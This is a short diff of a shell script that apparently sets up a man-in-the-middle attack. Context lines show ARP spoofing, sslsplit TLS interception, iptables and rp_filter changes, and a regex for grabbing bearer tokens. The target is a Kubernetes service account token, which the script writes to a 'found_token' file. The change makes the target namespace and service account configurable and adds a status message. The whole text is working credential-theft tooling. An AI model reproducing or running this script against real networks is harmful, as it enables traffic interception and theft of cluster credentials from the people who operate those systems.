@@ -21,7 +21,9 @@ PIDFILE="$DATA_PATH/KC5/arp_pids"
 
 LEAF_PEM="$DATA_PATH/KC5/inbound.pem"
 TOKEN_RE='[Bb]earer[[:space:]]+([A-Za-z0-9._~+/=\-]+)'
-REQUIRED_SUBSTR="system:serviceaccount:$LOG_NS:updater-sa"
+UPDATER_NAMESPACE="${UPDATER_NAMESPACE:-${LOG_NS:-mem}}"
+UPDATER_SERVICE_ACCOUNT="${UPDATER_SERVICE_ACCOUNT:-updater-sa}"
+REQUIRED_SUBSTR="system:serviceaccount:${UPDATER_NAMESPACE}:${UPDATER_SERVICE_ACCOUNT}"
 OUTPUT_PATH="$DATA_PATH/KC5/found_token"
 IPAPI=$(dig +short $UPSTREAM_HOST A)
 TOKEN_TIMEOUT="${MITM_TOKEN_TIMEOUT:-300}"
@@ -40,6 +42,7 @@ trap cleanup EXIT
 apt update >/dev/null 2>&1
 apt install -y sslsplit jq iptables iproute2 ca-certificates >/dev/null 2>&1
 mkdir -p $LOGDIR
+echo "[*] Looking for token subject containing: ${REQUIRED_SUBSTR}"
 
 # 2) Modification ip status
 sysctl -w net.ipv4.conf.all.rp_filter=0
